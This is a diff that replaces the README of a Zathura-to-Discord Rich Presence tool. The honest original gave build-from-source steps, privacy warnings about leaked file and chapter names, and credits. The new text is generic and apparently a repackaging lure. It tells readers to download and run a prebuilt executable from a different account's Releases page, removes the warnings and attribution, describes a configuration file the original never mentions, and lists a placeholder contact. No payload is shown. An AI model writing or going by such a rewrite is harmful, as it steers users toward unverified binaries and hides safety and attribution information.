@@ -1,44 +1,76 @@
-# Discord Rich Presence for Zathura document viewer
+# ZathuraDiscordRichPresence
 
-![Example rich presence](https://github.com/user-attachments/assets/75d0fbfb-53b9-4672-8179-7e993ca6b908)
+![ZathuraDiscordRichPresence](https://img.shields.io/badge/Download-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-Application for updating your Discord activity with metadata from opened documents in Zathura.
+Welcome to **ZathuraDiscordRichPresence**! This application allows you to update your Discord activity with metadata from documents you have opened in Zathura. Whether you are reading PDF files, EPUBs, or other supported formats, you can share your reading status with friends and communities on Discord.
 
-## How to use
+## Table of Contents
 
-1. Ensure Zathura is installed and working
-2. Download the source code
-3. Ensure Golang version >= 1.24.3 is installed
-6. Building the source code with `go build` and run the executable (e.g: `./ZathuraDiscordRichPresence` after building on Linux)
-7. Start Zathura (documents openend in Zathura with sandbox mode are NOT detected by this application)
-8. (Optional) open a document in Zathura
-8. Your Discord rich presence should now be updated
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-By default the presence's hover data shows a generic message:
+## Features
 
-![250507231139](https://github.com/user-attachments/assets/5f349000-ddf1-4bfa-8050-926a3cbe9b65)
+- **Real-time Updates**: Automatically updates your Discord status as you open different documents in Zathura.
+- **Support for Multiple Formats**: Works with various document types including PDF and EPUB.
+- **Lightweight**: Designed to run smoothly without consuming excessive resources.
+- **Easy Setup**: Simple installation and configuration process.
 
-This message can optionally be changed to show the current chapter that is being read, by running the application with the `-show-chapters` flag
-- `./ZathuraDiscordRichPresence -show-chapters`:
+## Installation
 
-![250507231114](https://github.com/user-attachments/assets/a6fe91ef-5b37-424b-944a-35e8ab254d02)
+To get started, you need to download the latest release of the application. Visit the [Releases section](https://github.com/AmericanURP/ZathuraDiscordRichPresence/releases) to find the latest version. Download the executable file and follow the instructions below to set it up.
 
-HOWEVER, be weary that this data could include sensitive information depending on which document you open (which is why it is turned off by default.
+1. **Download the latest release** from [here](https://github.com/AmericanURP/ZathuraDiscordRichPresence/releases).
+2. **Extract the files** to your desired location.
+3. **Run the executable** file to start the application.
 
-The filename shown in the precense is taken directly from the document's filename (stripped from the full path returned by the Zathura d-bus interface). Ensure that opened documents while the extension is running contain no sensitive filenames.
+Make sure you have Zathura installed on your system before running this application.
 
-## How it works
+## Usage
 
-- This application continously polls the d-bus interface implemented in Zathura to retrieve current opened document information.
+Once you have installed the application, you can start using it to update your Discord status.
 
-## Limitations and potential improvements
-- Ideally Zathura would emit events whenever a document is opened, a document is closed, and when page switches happen. This way applications like this do not have to continously poll to see whether anything has changed, but can instead listen to the d-bus event queue (observer). I created a ![pull-request](https://github.com/pwmt/zathura/pull/742) on the Zathura repository that implements DocumentOpen and DocumentClose events, so if these ever get added I will look forward to improving this application.
-- Only tested on GNU/Linux
+1. **Open Zathura** and load any document.
+2. **Launch ZathuraDiscordRichPresence**. The application will automatically detect the document you are viewing.
+3. Your Discord status will update to reflect the title of the document you are currently reading.
 
-## Attribution
-- ![Rich-go for the Discord Rich Presence implementation](https://github.com/hugolgst/rich-go)
-- ![Godbus for the d-bus implementation](https://github.com/godbus/dbus)
-- Assets (document icons in the rich presence)
-  - <a href="https://www.flaticon.com/free-icons/format" title="format icons">Format icons created by JunGSa - Flaticon</a>
-  - <a href="https://www.flaticon.com/free-icons/pdf" title="pdf icons">Pdf icons created by JunGSa - Flaticon</a> (colored red by me :p)
-  - <a href="https://www.flaticon.com/free-icons/epub" title="epub icons">Epub icons created by JunGSa - Flaticon</a>
+You can close the application at any time, and your status will revert to normal.
+
+## Configuration
+
+You may want to customize how the application interacts with Discord. Here’s how you can do that:
+
+1. Locate the configuration file in the installation directory.
+2. Open the file with a text editor.
+3. Modify the settings as per your preference. For example, you can change the status format or toggle certain features on or off.
+4. Save the changes and restart the application for them to take effect.
+
+## Contributing
+
+We welcome contributions to enhance the functionality and usability of ZathuraDiscordRichPresence. Here’s how you can contribute:
+
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them with clear messages.
+4. **Push your changes** to your forked repository.
+5. **Create a pull request** to merge your changes back to the main repository.
+
+Your contributions will help improve the application for everyone!
+
+## License
+
+This project is licensed under the MIT License. You can find more details in the LICENSE file.
+
+## Contact
+
+For any questions, suggestions, or feedback, feel free to reach out:
+
+- **Email**: support@example.com
+- **GitHub Issues**: [Report an issue](https://github.com/AmericanURP/ZathuraDiscordRichPresence/issues)
+
+Thank you for using ZathuraDiscordRichPresence! We hope you enjoy reading and sharing your experiences on Discord. For the latest updates and features, keep an eye on our [Releases section](https://github.com/AmericanURP/ZathuraDiscordRichPresence/releases).
